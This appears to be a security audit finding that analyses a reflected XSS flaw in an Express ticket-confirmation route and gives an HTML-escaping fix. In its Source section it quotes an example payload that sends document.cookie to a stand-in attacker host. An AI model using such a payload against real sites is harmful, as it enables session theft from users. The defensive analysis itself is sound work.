## Verdict

Exploitable. Confidence: high.

## Source

Two untrusted inputs reach the sink unescaped:

- `req.params.id` - the `:id` URL path segment on `GET /tickets/:id/confirmation` (line 9), interpolated directly into the page at line 22 (`Ticket ${req.params.id} - ...`).
- `req.query.note` - the `note` query-string parameter, read at line 17 into `closingNote` with no transformation, then interpolated at line 24 (`Agent note: ${closingNote}`).

Both flow into a template literal (`page`, lines 19-27) with no HTML encoding at any point along the way, and that literal is passed straight to `res.send(page)` at line 30 (the sink), which writes it to the response with `Content-Type: text/html`. A request such as `GET /tickets/T-1001/confirmation?note=<script>document.location='https://evil.example/steal?c='+document.cookie</script>` reflects the script into the response and executes it in the agent's browser. `ticket.subject` and `ticket.status` (lines 22-23) come from the server-side in-memory `tickets` map, not from request data, so they are not part of this taint path.

## Fix

Vulnerable code:

```javascript
app.get('/tickets/:id/confirmation', (req, res) => {
    const ticket = tickets[req.params.id];
    if (!ticket) {
        return res.status(404).send('Ticket not found');
    }

    const closingNote = req.query.note || '';

    const page = `
        <html>
            <body>
                <h1>Ticket ${req.params.id} - ${ticket.subject}</h1>
                <p>Status: ${ticket.status}</p>
                <p>Agent note: ${closingNote}</p>
            </body>
        </html>
    `;

    // SAST FINDING: CWE-79 sink is the next statement.
    res.send(page);
});
```

Fixed code:

```javascript
function escapeHtml(value) {
    return String(value).replace(/[&<>"']/g, (char) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;',
    }[char]));
}

app.get('/tickets/:id/confirmation', (req, res) => {
    const ticket = tickets[req.params.id];
    if (!ticket) {
        return res.status(404).send('Ticket not found');
    }

    const closingNote = req.query.note || '';

    const page = `
        <html>
            <body>
                <h1>Ticket ${escapeHtml(req.params.id)} - ${escapeHtml(ticket.subject)}</h1>
                <p>Status: ${escapeHtml(ticket.status)}</p>
                <p>Agent note: ${escapeHtml(closingNote)}</p>
            </body>
        </html>
    `;

    res.send(page);
});
```

No library recommendation: the finding is a plain template literal handed to `res.send()` rather than `innerHTML`, `dangerouslySetInnerHTML`, or a templating engine's raw-output tag, so none of the libraries named in the JavaScript CWE-79 guidance (DOMPurify, a templating engine's escape mode) apply. A small local HTML-entity-escaping function is the appropriate context-specific encoder for HTML body text, matching the root guidance's "apply context-aware output encoding" principle.

## Explanation

The handler builds the response as a raw HTML string and interpolates two request-controlled values - `req.params.id` and `req.query.note` - into it with no encoding, then sends that string with `res.send()`, whose sink contract is to write the string verbatim as the response body with the content type inferred from it (here `text/html`). The fix adds `escapeHtml()`, applied at each of the four interpolation points inside the template literal, converting `&`, `<`, `>`, `"`, and `'` to their HTML entity equivalents before the string is assembled. This keeps any attacker-supplied markup or script tags inert as literal text in the rendered page instead of being parsed as HTML/JS by the browser, which closes the reflected-XSS path without changing the route's URL, status codes, or response structure. `ticket.subject` and `ticket.status` are also passed through `escapeHtml()` even though the current in-memory store is not attacker-controlled, since they render into the same HTML context and a future data source for that map (e.g. a database) would otherwise silently reopen the same weakness; this is within the sink's own encoding responsibility and not an unrelated change.

## Behaviour changes

- For the two untrusted values (`req.params.id`, `closingNote`), any character among `& < > " '` in the input now renders as its literal text form (e.g. an apostrophe in a note renders as `&#39;` in the raw HTML source) instead of as a raw character. The rendered page still displays the correct human-readable text in the browser; only the raw HTML source differs, and only for these five characters.
- Same change applied to `ticket.subject` and `ticket.status` for consistency of the same output sink, even though today's in-memory data does not contain any of those characters, so no observable output difference exists yet for the sample data in this file.
- No change to status codes, headers, route matching, control flow, or the 404 path for an unknown ticket ID.
